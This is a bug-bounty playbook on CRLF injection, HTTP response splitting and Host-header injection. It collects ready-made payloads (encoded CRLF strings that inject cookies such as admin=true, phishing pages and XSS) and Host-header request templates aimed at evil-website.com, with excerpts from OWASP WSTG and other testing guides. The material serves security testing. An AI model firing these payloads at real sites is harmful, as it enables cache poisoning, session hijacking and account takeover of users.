# Real-World Playbook — CRLF / Response-Splitting / Host-Header

**Class:** `crlf-hostheader` · **Coverage-matrix tier:** 1 · **Hunter2:** /crlf · tools/crlf_scanner.py · **Skill:** web2-vuln-classes
**Sources:** [reddelexc/hackerone-reports](https://github.com/reddelexc/hackerone-reports) (disclosed reports) · [Az0x7/vulnerability-Checklist](https://github.com/Az0x7/vulnerability-Checklist) (test flow) · [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) + [payloadbox](https://github.com/payloadbox) (payloads) · [OWASP WSTG](https://github.com/OWASP/wstg) + [HowToHunt](https://github.com/KathanP19/HowToHunt) + [AllAboutBugBounty](https://github.com/daffainfo/AllAboutBugBounty) + [HackTricks](https://github.com/HackTricks-wiki/hacktricks) (method)

## Real payloads
*(actual attack strings — adapt to the injection context; fire only where a real sink exists)*

### PayloadsAllTheThings
```
HTTP/1.1 200 OK
Content-Type: text/html
Set-Cookie: sessionid=abc123
```
```
HTTP/1.1 200 OK
Content-Type: text/html
Set-Cookie: sessionid=value
Set-Cookie: admin=true
```
```
http://www.example.net/index.php?lang=en%0D%0AContent-Length%3A%200%0A%20%0AHTTP/1.1%20200%20OK%0AContent-Type%3A%20text/html%0ALast-Modified%3A%20Mon%2C%2027%20Oct%202060%2014%3A50%3A18%20GMT%0AContent-Length%3A%2034%0A%20%0A%3Chtml%3EYou%20have%20been%20Phished%3C/html%3E
```
```
Set-Cookie:en
Content-Length: 0

HTTP/1.1 200 OK
Content-Type: text/html
Last-Modified: Mon, 27 Oct 2060 14:50:18 GMT
Content-Length: 34

<html>You have been Phished</html>
```
```
http://example.com/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg%20onload=alert(document.domain)>%0d%0a0%0d%0a/%2f%2e%2e
```
```
HTTP/1.1 200 OK
Date: Tue, 20 Dec 2016 14:34:03 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 22907
Connection: close
X-Frame-Options: SAMEORIGIN
Last-Modified: Tue, 20 Dec 2016 11:50:50 GMT
ETag: "842fe-597b-54415a5c97a80"
Vary: Accept-Encoding
X-UA-Compatible: IE=edge
Server: NetDNA-cache/2.2
Link: https://example.com/[INJECTION STARTS HERE]
Content-Length:35
X-XSS-Protection:0

23
<svg onload=alert(document.domain)>
0
```
```
%0d%0aLocation:%20http://myweb.com
```
```
嘊嘍content-type:text/html嘊嘍location:嘊嘍嘊嘍嘼svg/onload=alert(document.domain()嘾
```
```
%E5%98%8A%E5%98%8Dcontent-type:text/html%E5%98%8A%E5%98%8Dlocation:%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%BCsvg/onload=alert%28document.domain%28%29%E5%98%BE
```

## Real attacker flow / methodology
*(how real hunters approach this class step by step)*

### From OWASP WSTG (testing guide)
### HTTP Response Splitting

|ID          |
|------------|
|WSTG-INJT-15|

#### Summary

HTTP Response Splitting is a vulnerability that occurs when an application incorporates unsanitized user input into HTTP response headers, allowing an attacker to inject Carriage Return (CR) and Line Feed (LF) characters. As a result, a single HTTP response can be interpreted as multiple distinct responses by clients or intermediary systems.

Successful exploitation of HTTP Response Splitting can lead to various impacts, including web cache poisoning, cross-site scripting (XSS), content spoofing, session fixation, or other client-side attacks, depending on how the injected response is processed.

This section focuses exclusively on identifying and testing HTTP Response Splitting vulnerabilities at the application layer. HTTP Request Smuggling, which relies on parsing inconsistencies between multiple HTTP agents, is covered in a separate chapter.

#### Test Objectives

- Identify user-controlled input that is reflected into HTTP response headers.
- Assess whether CR (`\r`) and LF (`\n`) characters can be injected into response headers.
- Determine the potential impact of successful HTTP Response Splitting attacks, such as cache poisoning or client-side exploitation.

#### How to Test

##### Black-Box Testing

Some web applications use user-supplied input to generate the values of certain HTTP response headers. A common example is redirection logic, where the destination URL is derived from a request parameter.

For instance, assume a user is asked to choose between a standard or advanced interface. The selected option is passed as a parameter and reflected in a redirection response header.

If the parameter `interface` has the value `advanced`, the application may respond with:

```http
HTTP/1.1 302 Moved Temporarily
Date: Sun, 03 Dec 2005 16:22:19 GMT
Location: https://victim.com/main.jsp?interface=advanced
```

When the browser receives this response, it follows the URL specified in the `Location` header. However, if the application does not properly validate or sanitize user input, an attacker may inject the sequence `%0d%0a`, representing CRLF characters used to separate HTTP header lines.

By injecting CRLF sequences, a tester may cause the response to be interpreted as two separate HTTP responses by downstream clients or intermediary systems, such as web caches. This behavior can be exploited to poison caches or deliver malicious content to users.

For example, the tester supplies the following value for the `interface` parameter:

`advanced%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2035%0d%0a%0d%0a<html>Sorry,%20System%20Down</html>`

The resulting response from the vulnerable application may be:

```http
HTTP/1.1 302 Moved Temporarily
Date: Sun, 03 Dec 2005 16:22:19 GMT
Location: https://victim.com/main.jsp?interface=advanced
Content-Length: 0

HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 35

<html>Sorry,%20System%20Down</html>
```

A web cache processing this response may interpret it as two distinct responses. If the attacker immediately issues a subsequent request for `/index.html`, the cache may associate that request with the second response and store it. As a result, all subsequent users accessing `victim.com/index.html` through that cache may receive the attacker-controlled content.

*(truncated — open the source link for the full method)*

### From AllAboutBugBounty
### Host Header Injection

#### Introduction
HTTP Host header attacks exploit vulnerable websites that handle the value of the Host header in an unsafe way. If the server implicitly trusts the Host header, and fails to validate or escape it properly, an attacker may be able to use this input to inject harmful payloads that manipulate server-side behavior. Attacks that involve injecting a payload directly into the Host header are often known as "Host header injection" attacks.

#### Where to find
In the feature where the website can send email to us. For example forgot password / newsletter.

#### How to exploit
1. Change the host header
```
GET /index.php HTTP/1.1
Host: evil-website.com
...
```
2. Duplicating the host header
```
GET /index.php HTTP/1.1
Host: vulnerable-website.com
Host: evil-website.com
...
```
3. Add line wrapping
```
GET /index.php HTTP/1.1
 Host: vulnerable-website.com
Host: evil-website.com
...
```
4. Add host override headers
```
X-Forwarded-For: evil-website.com
X-Forwarded-Host: evil-website.com
X-Client-IP: evil-website.com
X-Remote-IP: evil-website.com
X-Remote-Addr: evil-website.com
X-Host: evil-website.com
```
How to use? In this case im using "X-Forwarded-For : evil.com"
```
GET /index.php HTTP/1.1
Host: vulnerable-website.com
X-Forwarded-For : evil-website.com
...
```
5. Supply an absolute URL
```
GET https://vulnerable-website.com/ HTTP/1.1
Host: evil-website.com
...
```

#### References
* [PortSwigger](https://portswigger.net/web-security/host-header/exploiting)

### From HackTricks (excerpt — see [HackTricks](https://github.com/HackTricks-wiki/hacktricks) for full)
### CRLF (%0D%0A) Injection


##### CRLF

Carriage Return (CR) and Line Feed (LF), collectively known as CRLF, are special character sequences used in the HTTP protocol to denote the end of a line or the start of a new one. Web servers and browsers use CRLF to distinguish between HTTP headers and the body of a response. These characters are universally employed in HTTP/1.1 communications across various web server types, such as Apache and Microsoft IIS.

##### CRLF Injection Vulnerability

CRLF injection involves the insertion of CR and LF characters into user-supplied input. This action misleads the server, application, or user into interpreting the injected sequence as the end of one response and the beginning of another. While these characters are not inherently harmful, their misuse can lead to HTTP response splitting and other malicious activities.

##### Example: CRLF Injection in a Log File

[Example from here](https://www.invicti.com/blog/web-security/crlf-http-header/)<sup>[[1]](#references)</sup>

Consider a log file in an admin panel that follows the format: `IP - Time - Visited Path`. A typical entry might look like:

```
123.123.123.123 - 08:15 - /index.php?page=home
```

An attacker can exploit a CRLF injection to manipulate this log. By injecting CRLF characters into the HTTP request, the attacker can alter the output stream and fabricate log entries. For instance, an injected sequence might transform the log entry into:

*(truncated — open the source link for the full method)*

## Chaining — always ask "what does this unlock?"
- Host-header → password-reset poisoning → ATO
- CRLF → Set-Cookie injection / cache poisoning
- CRLF → reflected XSS via injected header

## Hunter2 wiring
- **Run:** `/crlf · tools/crlf_scanner.py`
- **Skill:** `web2-vuln-classes`
- **Coverage-matrix tier:** 1 (Tier 0 = test first)
